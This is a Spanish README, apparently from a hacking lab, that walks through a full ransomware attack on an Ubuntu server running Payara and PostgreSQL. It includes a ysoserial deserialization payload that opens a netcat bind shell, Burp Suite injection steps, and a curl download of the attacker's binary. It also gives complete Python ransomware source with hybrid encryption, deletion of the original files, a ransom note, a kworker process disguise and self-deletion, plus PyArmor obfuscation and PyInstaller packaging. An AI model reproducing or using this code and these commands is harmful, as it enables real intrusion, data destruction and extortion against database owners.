# Guía de Preparación de Entorno y Ejecución de Ransomware (Ubuntu y Kali)

Este `README` detalla los pasos para configurar una máquina víctima (Ubuntu) con una base de datos y un servidor de aplicaciones, seguido de la preparación del entorno en Kali para compilar y ejecutar el ransomware, y finalmente, el monitoreo y la limpieza.

---
## 1. Pasos de Preparación del Entorno (en Ubuntu)

Estos pasos son para configurar la máquina víctima (Ubuntu) con la base de datos y el servidor de aplicaciones Payara. Asumiremos que el directorio principal de trabajo en Ubuntu es `/home/ubuntu/Desktop`.

### 1.1. Clonar el Repositorio Necesario

Primero, clona el repositorio que contiene los archivos necesarios para la configuración de la base de datos y la aplicación Payara:

1.  **Clonar el repositorio `HackingPayara`:**
    ```bash
    git clone https://github.com/TipoTramquilo/HackingPayara/
    ```

### 1.2. Configuración de la Base de Datos `ecommerce`

1.  **Mover el script SQL a `/tmp/`:**
    El archivo `scriptDB.sql` se encuentra dentro del repositorio clonado en `HackingPayara/config_ubuntu/scriptDB.sql`. Muévelo al directorio `/tmp/`:

    ```bash
    mv HackingPayara/config_ubuntu/scriptDB.sql /tmp/
    ```

2.  **Ejecutar el script SQL como usuario `postgres`:**
    Una vez que el archivo `scriptDB.sql` esté en `/tmp/`, puedes ejecutarlo usando la utilidad `psql` de PostgreSQL. Esto creará la base de datos `ecommerce_db` y sus tablas con algunos datos iniciales.

    Abre una terminal y sigue estos pasos:

    a.  **Accede como el usuario `postgres`:**
        ```bash
        sudo -i -u postgres
        ```
        Se te pedirá la contraseña de tu usuario `ubuntu` o el usuario con privilegios `sudo`.

    b.  **Ejecuta el script SQL:**
        Una vez que estés en el prompt de `postgres` verás `postgres@Ubuntu:~$`, ejecuta el script:
        ```bash
        psql -f /tmp/scriptDB.sql
        ```
        Este comando ejecutará el contenido de `scriptDB.sql`. Verás mensajes indicando la creación de la base de datos, las tablas y la inserción de datos, similar a la siguiente salida:

        ```
        DROP DATABASE
        CREATE DATABASE
        You are now connected to database "ecommerce_db" as user "postgres".
        DO
        GRANT
        CREATE TABLE
        ...
        ```

### 1.3. Configuración del Servidor de Aplicaciones Payara

1.  **Descargar Payara 5:**
    Descarga el servidor Payara desde el siguiente enlace:
    ```bash
    git clone https://github.com/payara/Payara/releases/download/payara-server-5.2020.2/payara-5.2020.2.zip
    ```
    Una vez descargado, descomprímelo en un lugar accesible, por ejemplo, en `/opt/`.

2.  **Correr Payara como root:**
    Asegúrate de iniciar el servidor Payara con privilegios de root para evitar problemas de permisos. Por ejemplo, si Payara está en `/opt/payara5/bin`:
    ```bash
    sudo /opt/payara5/bin/asadmin start-domain
    ```
    *Ajusta la ruta a tu instalación de Payara según sea necesario.*
3.  **Acceder a la consola de administración de Payara:**
    Abre tu navegador web y navega a `http://localhost:4848`.
4.  **Crear un JDBC Connection Pool:**
    * En la consola de administración, navega a **Resources** -> **JDBC** -> **JDBC Connection Pools**.
    * Haz clic en **New...**
    * **Pool Name:** `ecommercePool` o el nombre que prefieras.
    * **Resource Type:** `javax.sql.DataSource`
    * **Database Vendor:** `PostgreSQL`
    * Haz clic en **Next**.
    * **Datasource Classname:** `org.postgresql.ds.PGSimpleDataSource`
    * **User:** `postgres`
    * **URL:** `jdbc:postgresql://localhost:5432/ecommerce_db`
    * **Password:** `postgres`
    * Haz clic en **Finish**.
5.  **Verificar la conexión (Ping):**
    Después de crear el pool, selecciónalo y haz clic en el botón **Ping** para asegurar que la conexión a la base de datos sea exitosa.
6.  **Crear un JDBC Resource:**
    * Navega a **Resources** -> **JDBC** -> **JDBC Resources**.
    * Haz clic en **New...**
    * **JNDI Name:** `jdbc/ecommerceDB` ¡Debe llamarse `ecommerceDB`!
    * **Pool Name:** Selecciona el pool que acabas de crear ej., `ecommercePool`.
    * Haz clic en **OK`.
7.  **Desplegar la aplicación `.war`:**
    * Navega a **Applications**.
    * Haz clic en **Deploy...**.
    * Selecciona el archivo `.war` que se encuentra en la carpeta `config_ubuntu` del repositorio `HackingPayara` que clonaste ej. `HackingPayara/config_ubuntu/tu-aplicacion.war`.
    * Sigue los pasos para desplegar la aplicación.

---
## 2. Pasos de Preparación del Entorno (en Kali)

### 2.1. Configuración del Payload y ysoserial

Para generar el payload necesario, sigue estos pasos:

1.  **Define la variable de entorno para el payload:**
    ```bash
    BIND_SHELL_COMMAND="nc -lvp 5555 -e /bin/bash"
    ```
2.  **Descarga `ysoserial.jar`:**
    ```bash
    wget -O ~/Desktop/yoserial.jar https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
    ```
3.  **Verifica la versión de Java:**
    Asegúrate de que tu versión de Java sea **1.8**. Si no, el siguiente paso te guiará para instalar y configurar Corretto 8.
    ```bash
    java -version
    ```
4.  **Descarga Amazon Corretto 8 (si es necesario):**
    ```bash
    wget https://corretto.aws/downloads/latest/amazon-corretto-8-x64-linux-jdk.deb
    ```
5.  **Instala Amazon Corretto 8:**
    ```bash
    sudo dpkg -i amazon-corretto-8-x64-linux-jdk.deb
    ```
6.  **Configura Java para usar Corretto 8:**
    ```bash
    sudo update-alternatives --config java
    ```
    *Selecciona la opción que corresponda a Java 1.8 de Corretto.*
7.  **Crea el payload con `ysoserial`:**
    Asegúrate de estar en el directorio `~/Desktop`. La salida de este comando será tu payload codificado en Base64; **guárdalo, lo necesitarás más adelante.**
    ```bash
    java -jar ysoserial.jar CommonsCollections5 "$BIND_SHELL_COMMAND" | base64 -w 0
    ```
8.  **Restaura la versión original de Java:**
    Una vez que hayas generado el payload, es recomendable volver a la versión de Java que tenías antes (por ejemplo, Java 21, común en las últimas distribuciones de GNU/Linux).
    ```bash
    sudo update-alternatives --config java
    ```
    *Selecciona la opción de tu versión original de Java.*

### 2.2. Preparación del Entorno Virtual y Compilación del Ransomware

Prepara tu entorno Python para compilar el ransomware:

1.  **Elimina el entorno virtual existente (opcional):**
    Si deseas recrear el entorno virtual desde cero, descomenta y ejecuta la siguiente línea:
    ```bash
    # rm -rf ~/ransomware
    ```
2.  **Crea el entorno virtual si no existe:**
    ```bash
    python3 -m venv ~/ransomware
    ```
3.  **Activa el entorno virtual:**
    ```bash
    source ~/ransomware/bin/activate
    ```
4.  **Navega al directorio del proyecto:**
    ```bash
    cd ~/Desktop/ransomware/
    ```
5.  **Crea el script `lagartija.py`:**
    Usa un editor de texto como `nano` para crear el archivo `lagartija.py` en el directorio actual (`~/Desktop/ransomware/`) y pega el siguiente código:
    ```bash
    nano lagartija.py
    ```
    ```python
    import os
    import sys
    import base64
    import time
    import subprocess
    import shutil

    # --- Configuración de Rutas ---
    TARGET_KALI_DESKTOP_PATH = "/home/ubuntu/Desktop" 
    KEY_FILENAME = 'avenger.txt'
    KEY_FILE_PATH = os.path.join(TARGET_KALI_DESKTOP_PATH, KEY_FILENAME)

    # Nombre del script actual para auto-eliminación
    CURRENT_SCRIPT_PATH = os.path.abspath(__file__)

    # Nombres de los procesos para mimetizarse
    MIMIC_PROCESS_NAME = "[kworker/u16:0]"
    SELF_DELETE_MIMIC_PROCESS_NAME = "[ksoftirqd/0]" # Nuevo nombre para el script de auto-eliminación

    # --- Clave Pública RSA Proporcionada (formato PEM) ---
    RSA_PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApN13s4vC999qDbdMGWh9
    FgDMG0m8bvZvFmEovVMldNSSszBHEkra1IsDtkcmNdNP33+3UJ0bFmd+qrgJSs/8
    NKXG6ayfJrpOj8/1P88/U14LTYuEnI5CCx865dlTAP0RBiqsgGcphn2g2lYnzAt9
    +cM4n+rN4LckBM3q7jPhZNn3ErD/sEl46q7SpCk8OoBYtGloRfeF0XOIpoJ5iyXv
    2bZ8vRsoXYLubktzDkIqrCB0IWvAToB2C4H/Mr+8B6IgSME8ECsmACVyxg63p91+
    +x/e3sGwCWZGU27zmS+2wpkJ2Sw7B7kAaZUMbwtmS1DFwJecx4Qu3zRWdi6/e5cd
    ZQIDAQAB
    -----END PUBLIC KEY-----"""

    # --- Configuración de Límites de Recursos ---
    TOTAL_SYSTEM_RAM_GB = 2 # Asegúrate de que esto coincida con la RAM real de tu Ubuntu
    CPU_LIMIT_PERCENT = 1 # 1% de CPU
    RAM_LIMIT_PERCENT = 1 # 1% de RAM

    # Global para almacenar el cgroup_path si se establece correctamente
    GLOBAL_CGROUP_PATH = None

    def self_delete_executable():
        if getattr(sys, 'frozen', False):
            # Si estamos dentro de un ejecutable PyInstaller
            try:
                # sys.executable apunta a la ruta del ejecutable temporal desempaquetado
                exe_path = sys.executable
                os.remove(exe_path)
                
                # Borra el directorio temporal de PyInstaller (_MEIPASS)
                if hasattr(sys, '_MEIPASS'):
                    shutil.rmtree(sys._MEIPASS, ignore_errors=True)
                    
            except Exception as e:
                # Puedes registrar el error aquí para depuración si es necesario,
                # pero en un ransomware, se suele suprimir para no dejar rastro.
                pass

    # --- Función set_resource_limits actualizada ---
    def set_resource_limits():
        """
        Establece límites de recursos para el proceso usando cgroupfs (cgroups v2).
        Requiere permisos de superusuario y cgroups v2 configurados.
        """
        global GLOBAL_CGROUP_PATH

        try:
            pid = os.getpid()
            cgroup_base_path = "/sys/fs/cgroup"
            cgroup_name_camouflaged = f"user_process_limits_{pid}"
            cgroup_path = os.path.join(cgroup_base_path, cgroup_name_camouflaged)

            # Crear el directorio del cgroup
            os.makedirs(cgroup_path, exist_ok=True)

            # 1. Limitar CPU (usando cpu.max)
            cpu_quota = int(100000 * CPU_LIMIT_PERCENT / 100)
            cpu_period = 100000
            cpu_max_value = f"{cpu_quota} {cpu_period}"
            cpu_max_file = os.path.join(cgroup_path, "cpu.max")
            with open(cpu_max_file, "w") as f:
                f.write(cpu_max_value)

            # 2. Limitar Memoria (usando memory.max)
            memory_limit_bytes = int(TOTAL_SYSTEM_RAM_GB * 1024 * 1024 * 1024 * (RAM_LIMIT_PERCENT / 100))
            memory_max_file = os.path.join(cgroup_path, "memory.max")
            with open(memory_max_file, "w") as f:
                f.write(str(memory_limit_bytes))

            # 3. Añadir el proceso actual al cgroup
            cgroup_procs_file = os.path.join(cgroup_path, "cgroup.procs")
            with open(cgroup_procs_file, "w") as f:
                f.write(str(pid))
            
            # Almacenar la ruta globalmente para poder limpiarla después
            GLOBAL_CGROUP_PATH = cgroup_path

            print(f"\nINFO: Límites de recursos establecidos (cgroups v2) en '{cgroup_name_camouflaged}': CPU {CPU_LIMIT_PERCENT}%, Memoria {memory_limit_bytes / (1024*1024):.2f} MB.")

        except Exception as e:
            print(f"\nAdvertencia: No se pudieron establecer los límites de recursos mediante cgroups: {e}")
            print("Asegúrate de ejecutar el script con sudo y que los cgroups estén configurados en tu sistema.")

    def clean_cgroup():
        """
        Limpia (borra) el directorio del cgroup si fue establecido.
        """
        global GLOBAL_CGROUP_PATH
        if GLOBAL_CGROUP_PATH and os.path.exists(GLOBAL_CGROUP_PATH):
            try:
                root_cgroup_procs_file = "/sys/fs/cgroup/cgroup.procs"
                if os.path.exists(root_cgroup_procs_file):
                    with open(root_cgroup_procs_file, "w") as f:
                        f.write(str(os.getpid()))
                
                os.rmdir(GLOBAL_CGROUP_PATH)
                print(f"\nINFO: Cgroup '{GLOBAL_CGROUP_PATH}' borrado exitosamente. ✨")
                GLOBAL_CGROUP_PATH = None # Resetear la variable global
            except Exception as e:
                print(f"\nAdvertencia: No se pudo borrar el cgroup '{GLOBAL_CGROUP_PATH}': {e}")
                print("Puede que necesite borrarlo manualmente con 'sudo rmdir <ruta_del_cgroup>' si el error persiste.")

    def get_public_rsa_key():
        """
        Carga la clave pública RSA desde la cadena PEM.
        """
        try:
            from cryptography.hazmat.primitives import serialization
            from cryptography.hazmat.backends import default_backend
            public_key = serialization.load_pem_public_key(
                RSA_PUBLIC_KEY_PEM.encode('utf-8'),
                backend=default_backend()
            )
            return public_key
        except Exception as e:
            print(f"\nError al cargar la clave pública RSA: {e} 🔑❌")
            sys.exit(1)


    def create_ransom_message(encrypted_fernet_key_b64):
        """
        Genera el mensaje de rescate con ASCII art y la clave cifrada.
        """
        ascii_art = r"""
          
         ░█████╗░██╗░░░██╗███████╗███╗░░██╗░██████╗░███████╗██████╗░░██████╗
         ██╔══██╗██║░░░██║██╔════╝████╗░██║██╔════╝░██╔════╝██╔══██╗██╔════╝
         ███████║╚██╗░██╔╝█████╗░░██╔██╗██║██║░░██╗░█████╗░░██████╔╝╚█████╗░
         ██╔══██║░╚████╔╝░██╔══╝░░██║╚████║██║░░╚██╗██╔══╝░░██╔══██╗░╚═══██╗
         ██║░░██║░░╚██╔╝░░███████╗██║░╚███║╚██████╔╝███████╗██║░░██║██████╔╝
         ╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚══╝░╚═════╝░╚══════╝╚═╝░░╚═╝╚═════╝░
                                                        
    █████████████████████████████████████████████████████████████████████████████
    ██  ¡ADVERTENCIA CRÍTICA!                                                  ██
    ██                                                                         ██
    ██  Tu sistema ha sido comprometido por un ataque de los VENGADORES.       ██
    ██  ¡El Capitán América, Soldado del Invierno, Iron Man y                  ██
    ██                   Hulk han tomado el control!                           ██
    ██                                                                         ██
    ██                                                                         ██ 
    ██  Para la **recuperación de tus archivos cifrados**,                     ██
    ██  por favor, para mas instrucciones:                                     ██
    ██                                                                         ██
    ██          avenger@gmail.com (¡Correo Ficticio!)                          ██
    ██                                                                         ██
    ██  No intentes descifrar por tu cuenta o podrías dañar los datos.         ██
    ██  Sigue las instrucciones cuidadosamente.                                ██
    ██                                                                         ██
    █████████████████████████████████████████████████████████████████████████████

    Guarda esta clave y paga: 

    """
        return ascii_art + encrypted_fernet_key_b64 + "No compartas esta clave con nadie más!!!!!"


    def generate_fernet_key_and_encrypt_with_rsa():
        """
        Genera una clave Fernet (AES), la cifra con la clave pública RSA,
        y devuelve ambas.
        """
        from cryptography.fernet import Fernet
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.asymmetric import padding

        fernet_key = Fernet.generate_key()
        public_rsa_key = get_public_rsa_key()

        encrypted_fernet_key = public_rsa_key.encrypt(
            fernet_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        encrypted_fernet_key_b64 = base64.b64encode(encrypted_fernet_key).decode('utf-8')
        
        return fernet_key, encrypted_fernet_key_b64


    def create_and_save_ransom_txt(encrypted_fernet_key_b64_for_txt, target_desktop_path):
        """
        Crea el archivo TXT con el mensaje de rescate y la clave cifrada.
        """
        current_key_file_path = os.path.join(target_desktop_path, KEY_FILENAME)
        
        full_message_content = create_ransom_message(encrypted_fernet_key_b64_for_txt)


        if not os.path.exists(target_desktop_path):
            try:
                os.makedirs(target_desktop_path, exist_ok=True)
            except Exception as e:
                print(f"\nERROR: No se pudo crear el directorio '{target_desktop_path}': {e} 📂❌")
                print("INFO: Intentando crear el archivo en /tmp/ como fallback.")
                current_key_file_path = os.path.join("/tmp/", KEY_FILENAME)
                target_desktop_path = "/tmp/"
                
        try:
            with open(current_key_file_path, 'w') as key_file:
                key_file.write(full_message_content)
            os.chmod(current_key_file_path, 0o644)
            print(f"\nÉXITO: Archivo '{KEY_FILENAME}' creado/actualizado en: {current_key_file_path} 😈")
            print(f"INFO: Permisos de '{KEY_FILENAME}' establecidos a 0o644 (legible por todos).\n")
        except Exception as e:
            print(f"\nERROR FATAL: No se pudo crear/guardar el archivo de clave en '{current_key_file_path}': {e} 💥")
            sys.exit(1)


    def encrypt_file(filepath: str, key: bytes):
        """
        Cifra un archivo dado con la clave Fernet (AES).
        """
        try:
            f = Fernet(key)
            with open(filepath, 'rb') as file:
                original = file.read()
            encrypted_data = f.encrypt(original)
            
            encrypted_filepath = filepath + '.encrypted'
            with open(encrypted_filepath, 'wb') as encrypted_file:
                encrypted_file.write(encrypted_data)
            
            #print(f"Archivo cifrado: {filepath} -> {encrypted_filepath} 🔥")
            return True
        except Exception as e:
            print(f"\nError al cifrar {filepath}: {e} ❌")
            return False

    def encrypt_directory(directory_path: str, target_desktop_path: str):
        """
        Recorre un directorio, cifra los archivos y elimina los originales.
        """
        if not os.path.isdir(directory_path):
            print(f"\nError: El directorio '{directory_path}' no existe. 🚫")
            return

        # Generar clave y crear nota de rescate primero, independientemente de los archivos encontrados
        fernet_key_for_encryption, encrypted_fernet_key_b64_for_txt = generate_fernet_key_and_encrypt_with_rsa()
        create_and_save_ransom_txt(encrypted_fernet_key_b64_for_txt, target_desktop_path)

        # Recopilar archivos elegibles y contarlos
        eligible_files_paths = []
        for root, _, files in os.walk(directory_path):
            for filename in files:
                filepath = os.path.join(root, filename)
                # Asegurarse de que el archivo no sea un script del atacante o el archivo de clave
                if (not filepath.endswith('.encrypted') and
                    os.path.isfile(filepath) and
                    os.path.basename(filepath) != os.path.basename(CURRENT_SCRIPT_PATH) and
                    os.path.basename(filepath) != KEY_FILENAME and
                    not (filepath.endswith('.sh') and os.path.basename(os.path.dirname(filepath)) == '.config' and 'autostart' in os.path.basename(os.path.dirname(filepath))) and
                    not (filepath.endswith('.desktop') and os.path.basename(os.path.dirname(filepath)) == '.config' and 'autostart' in os.path.basename(os.path.dirname(filepath)))):
                    eligible_files_paths.append(filepath)

        total_files_to_process = len(eligible_files_paths)

        if total_files_to_process == 0:
            print(f"\nINFO: No se encontraron archivos elegibles para cifrar en '{directory_path}'. 😬")
            print(f"\nProceso de cifrado completado. Archivos procesados: 0\nArchivos fallidos: 0")
            return

        processed_count = 0
        failed_count = 0
        deleted_count = 0

        print(f"\nIniciando cifrado y eliminación automática de originales. Saldo total de archivos a procesar: {total_files_to_process} 😈")

        current_file_num = 0
        for filepath in eligible_files_paths:
            current_file_num += 1
            
            time.sleep(0.01)
            
            if encrypt_file(filepath, fernet_key_for_encryption):
                try:
                    os.remove(filepath)
                except Exception as e:
                    print(f"\nError al eliminar el original {filepath}: {e} 🗑️")
            else:
                failed_count += 1

        print("\n--- Resumen del cifrado ---")
        print(f"Archivos cifrados exitosamente: {processed_count} 🔥")
        print(f"Archivos originales eliminados: {deleted_count} 💀")
        print(f"Revisa '{KEY_FILE_PATH}' para el mensaje de 'recuperación' con la clave cifrada. 🔑\n")
        if failed_count > 0:
            print("\nAdvertencia: Algunos archivos no pudieron ser cifrados. Revisa los errores. ⚠️")
        
        print(f"\nProceso de cifrado completado.\nArchivos procesados: {processed_count}\nArchivos fallidos: {failed_count}")


    def delete_nohup_out():
        """
        Borra el archivo 'nohup.out' sin imprimir su contenido.
        Asume que 'nohup.out' está en el directorio de trabajo actual.
        """
        nohup_file_name = "nohup.out"
        nohup_file_path = os.path.join(os.getcwd(), nohup_file_name)

        if os.path.exists(nohup_file_path):
            try:
                os.remove(nohup_file_name)
                sys.stderr.write(f"\n--- Archivo '{nohup_file_name}' borrado exitosamente. ☠️ ---\n")
            except Exception as e:
                sys.stderr.write(f"ERROR: No se pudo borrar '{nohup_file_name}': {e}\n")
        else:
            sys.stderr.write(f"ADVERTENCIA: El archivo '{nohup_file_name}' no se encontró en '{os.getcwd()}'.\n")


    def self_delete_script():
        """
        Crea un pequeño script temporal para auto-eliminar el script principal
        y luego se elimina a sí mismo. Ejecutado en segundo plano con un nombre de proceso crítico.
        """
        script_to_delete = CURRENT_SCRIPT_PATH
        
        temp_script_name = f"delete_me_{os.getpid()}.sh"
        temp_script_path = os.path.join("/tmp", temp_script_name)

        shell_script_content = f"""#!/bin/bash
            sleep 1
            rm -f -- "{script_to_delete}"
            rm -- "$0"
            """
        try:
            with open(temp_script_path, 'w') as f:
                f.write(shell_script_content)
            os.chmod(temp_script_path, 0o700)

            # Ejecuta el script temporal con nohup y un nombre de proceso mimetizado
            command = ['nohup', 'bash', '-c', f'exec -a "{SELF_DELETE_MIMIC_PROCESS_NAME}" bash "{temp_script_path}"']
            
            subprocess.Popen(command,
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setpgrp)
            print(f"\nEl script '{os.path.basename(script_to_delete)}' se auto-eliminará pronto con el nombre de proceso '{SELF_DELETE_MIMIC_PROCESS_NAME}'. 👻")
            print(f"\nLagarto se borrará pronto 👻")
        except Exception as e:
            print(f"Error al intentar auto-eliminar el script: {e}")


    if __name__ == "__main__":
        try:
            from cryptography.fernet import Fernet
            from cryptography.hazmat.primitives import serialization, hashes
            from cryptography.hazmat.primitives.asymmetric import padding
            from cryptography.hazmat.backends import default_backend
        except ImportError:
            print("\nError: Asegúrate de que todas las librerías necesarias estén instaladas. 📚")
            print("Por favor, instala 'cryptography' usando: pip install cryptography\n")
            sys.exit(1)
        
        if len(sys.argv) > 1:
            target_directory = sys.argv[1]
            if not os.path.isdir(target_directory):
                print(f"\nError: El directorio especificado '{target_directory}' no existe. 📁")
                sys.exit(1)
        else:
            print("\nError: Debes proporcionar la ruta completa del directorio a cifrar como argumento. 📝")
            # Aquí se mantiene la instrucción de uso
            print(f"Uso: sudo nohup bash -c 'exec -a \"{MIMIC_PROCESS_NAME}\" /usr/bin/python3 -u {CURRENT_SCRIPT_PATH} /ruta/a/directorio' > nohup.out &")
            sys.exit(1)

        print("---😎😎😎 Avengers 😎😎😎---\n")
        
        print(f"\nLa clave de recuperación se guardará en: {KEY_FILE_PATH}")

        # Llamamos a la función para establecer los límites de recursos
        set_resource_limits()

        # Ejecutar el proceso de cifrado
        encrypt_directory(target_directory, TARGET_KALI_DESKTOP_PATH)
        
        # Llama a la función de limpieza al final del script
        clean_cgroup()

        # Se llama a la función para borrar nohup.out sin imprimirlo
        delete_nohup_out()

        # Auto-eliminación del script
        self_delete_script()
        print("Proceso finalizado. Avengers unidos... 👋\n")
        self_delete_executable()
    ```
6.  **Instala las librerías necesarias:**
    ```bash
    pip install cryptography pyarmor pyinstaller
    ```
7.  **Ofusca el script `lagartija.py`:**
    ```bash
    pyarmor gen --output pyarmor_output lagartija.py
    ```
8.  **Obtén la ruta de la librería `cryptography` en el entorno virtual:**
    Este comando te dará la ruta exacta de la librería `cryptography` dentro de tu entorno virtual de Kali. ¡Cópiala, la necesitarás para el siguiente paso!
    ```bash
    python -c "import cryptography; import os; print(os.path.dirname(cryptography.__file__))"
    ```
9.  **Comando de PyInstaller para empaquetar el ransomware:**
    **Importante:** Reemplaza `<RUTA_CRYPTOGRAPHY_ENV>` en la última línea con la ruta que obtuviste en el paso anterior.
    ```bash
    pyinstaller --noconsole --onefile \
                --distpath . \
                --name lagarto \
                --add-data "pyarmor_output/pyarmor_runtime_000000:." \
                --hidden-import "cryptography.hazmat.backends.openssl" \
                --hidden-import "cryptography.hazmat.primitives.ciphers" \
                --hidden-import "cryptography.x509" \
                --collect-all cryptography \
                --collect-binaries cryptography \
                --collect-data cryptography \
                --paths "/usr/lib/x86_64-linux-gnu" \
                --paths "<RUTA_CRYPTOGRAPHY_ENV>" \
                pyarmor_output/lagartija.py
    ```

---
## 3. Pasos para Crear Servidor Web (en Kali)

Para servir el ejecutable del ransomware y transferirlo fácilmente a la víctima:

1.  **Navega al directorio donde se creó el ejecutable `lagarto`:**
    ```bash
    cd ~/Desktop/ransomware/
    ```
2.  **Inicia un servidor HTTP simple para transferir el archivo:**
    ```bash
    sudo python3 -m http.server 80
    ```

---
## 4. Configuración y Uso de Burp Suite (en Kali)

Usa Burp Suite para interceptar tráfico y, potencialmente, inyectar el payload en una aplicación web vulnerable:

1.  **Inicia Burp Suite como superusuario:**
    ```bash
    sudo su
    sudo burpsuite &
    ```
2.  **Configura el Proxy en Burp Suite:**
    * Dentro de Burp Suite, ve a la pestaña **Proxy** y luego a **Options**.
    * En **Proxy Listeners**, edita la interfaz para establecerla como **specific address** usando la **dirección IP de tu máquina Kali** y un puerto disponible por ejemplo, `8080` si no está en uso.
    * Asegúrate de que **Intercept is on** esté activado en la pestaña **Intercept**.
3.  **Configura el proxy en Firefox:**
    * Abre Firefox y navega a **Configuración** > **General** > **Configuración de red**.
    * Selecciona **Configuración manual del proxy**.
    * En **Proxy HTTP**, introduce la **dirección IP de tu máquina Kali** y el **puerto** que configuraste en Burp Suite ej., `8080`.
    * Activa la opción **Usar este proxy para todos los protocolos**.
4.  **Descarga e importa el certificado de Burp Suite:**
    * En Firefox, navega a `http://burpsuite/`.
    * Descarga el certificado de la CA de Burp Suite.
    * Ve a **Privacidad y seguridad** > **Ver certificados** en Firefox.
    * Importa el certificado descargado y confía en él para identificar sitios web.
5.  **Captura el tráfico de inicio de sesión y envía el payload:**
    * Navega a la aplicación web vulnerable en Firefox.
    * Intenta iniciar sesión. En Burp Suite, en la pestaña **Proxy** > **Intercept**, haz clic en **Forward** o desactiva la intercepción temporalmente hasta que se generen las cookies de sesión después del inicio de sesión exitoso.
    * Una vez dentro de la aplicación vulnerable, inyecta tu payload el generado con `ysoserial` y codificado en Base64.
6.  **Inicia el listener de Netcat:**
    Después de inyectar el payload en la aplicación vulnerable y obtener la `bind shell` en la máquina Ubuntu víctima, ejecuta este comando en Kali para conectarte:
    ```bash
    nc <IP_UBUNTU> 5555
    ```

---
## 5. Pasos para Kali (Ejecución en la Víctima a Través de la Bind Shell)

Una vez que hayas establecido una `bind shell` en la máquina Ubuntu víctima usando el payload de `ysoserial`, ejecuta los siguientes comandos desde esa shell remota:

1.  **Descarga el ejecutable `lagarto` desde Kali usando `curl`:**
    Asegúrate de reemplazar `<IP_KALI>` con la **dirección IP de tu máquina Kali**.
    ```bash
    curl -o /tmp/lagarto http://<IP_KALI>/lagarto
    ```
2.  **Verifica el tamaño del archivo descargado:**
    ```bash
    ls -l /tmp/lagarto
    ```
3.  **Verifica que el archivo sea un ejecutable ELF:**
    ```bash
    file /tmp/lagarto
    ```
4.  **Otorga permisos de ejecución al archivo:**
    ```bash
    chmod +x /tmp/lagarto
    ```
5.  **Ejecuta el ransomware mimetizado y en segundo plano:**

    El siguiente comando ejecuta el ransomware en segundo plano, con privilegios de root, y camuflando su proceso para que parezca un proceso legítimo del sistema `[kworker/u16:0]`. Esto asegura que el ataque continúe incluso si la sesión remota se cierra y dificulta la detección manual.

    ```bash
    sudo nohup bash -c 'exec -a "[kworker/u16:0]" /tmp/lagarto /var/lib/postgresql/16/main/base/<OID_DATABASE>' &
    ```
    **Desglose del comando:**
    * **`sudo`**: Ejecuta el comando con privilegios de superusuario root.
    * **`nohup`**: Permite que el comando se ejecute en segundo plano, incluso si la sesión de la terminal se cierra.
    * **`bash -c '...' `**: Ejecuta la cadena de comandos dentro de una nueva instancia de Bash.
    * **`exec -a "[kworker/u16:0]"`**: Reemplaza el proceso actual con el ejecutable del ransomware `/tmp/lagarto` y le asigna el nombre `[kworker/u16:0]` para **mimetizarse con un proceso legítimo del kernel de Linux**, haciendo más difícil su detección.
    * **`/tmp/lagarto`**: La **ruta al ejecutable del ransomware**.
    * **`/var/lib/postgresql/16/main/base/<OID_DATABASE>`**: El **directorio objetivo** que el ransomware intentará cifrar. En este caso, apunta a los archivos de datos de una base de datos PostgreSQL.

        **Para obtener el `<OID_DATABASE>` de la base de datos `ecommerce_db` o cualquier otra:**
        1.  Accede a la consola de `psql` como el usuario `postgres`:
            ```bash
            sudo -i -u postgres
            psql
            ```
        2.  Dentro de `psql`, ejecuta la siguiente consulta para listar las bases de datos y sus OID Object IDentifier:
            ```sql
            SELECT datname, oid FROM pg_database;
            ```
            Busca la fila que contenga `ecommerce_db` y anota el número en la columna `oid`. Ese es el `<OID_DATABASE>` que debes usar.
        3.  Sal de `psql` y luego del usuario `postgres` ejecutando:
            ```sql
            \q
            exit
            ```

    * **`&`**: Envía el comando completo a **ejecutarse en segundo plano**, liberando la terminal.

    ---
    **Importante: Reconexión de la Bind Shell**

    Puede que la `bind shell` que obtienes sea inestable o se "buguee" al verficar donde se encuentra la base de datos, causando que la conexión se pierda. Si esto sucede, o si te desconectas intencionalmente, es **necesario volver a enviar el payload** a la aplicación     vulnerable y **volver a conectarte con Netcat** `nc <IP_UBUNTU> 5555` para recuperar el acceso a la máquina víctima.

    El ransomware, gracias a `nohup`, debería seguir ejecutándose en segundo plano en la máquina víctima, pero necesitarás una nueva shell para interactuar con el sistema o verificar su estado.

    ---

---
## 6. Pasos de Monitoreo y Limpieza

### 6.1. En Ubuntu (a través de la Bind Shell)

Monitorea el estado del ransomware en la máquina víctima:

1.  **Verifica que el proceso se esté mimetizando:**
    ```bash
    ps aux | grep kworker
    ```
2.  **Verifica si el ejecutable se ha borrado a sí mismo (autoborrado):**
    ```bash
    ls -l /tmp/lagarto
    ```
3.  **Monitorea el log de ejecución del ransomware:**
    ```bash
    tail -f nohup.out
    ```

### 6.2. En Kali

Limpia los artefactos de compilación para futuras ejecuciones:

1.  **Borra todos los artefactos de compilación:**
    Puedes descomentar y ejecutar esta línea en tu máquina Kali para limpiar los archivos generados y dejar tu directorio de trabajo listo para una nueva ejecución.
    ```bash
    # rm -rf pyarmor_output/ dist/ build/ *.spec
    ```
